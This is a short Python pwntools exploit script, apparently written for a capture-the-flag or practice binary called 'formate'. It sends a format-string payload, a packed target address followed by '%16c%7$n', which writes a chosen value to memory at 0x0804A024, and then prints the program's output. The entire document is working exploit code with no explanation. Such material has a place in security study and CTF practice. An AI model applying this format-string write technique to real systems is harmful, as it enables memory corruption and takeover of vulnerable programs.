from pwn import*
p = process('./formate')
addr = 0x0804A024              
payload =  p32(addr)  + "%16c%7$n"
p.sendline(payload)
print p.recvall()

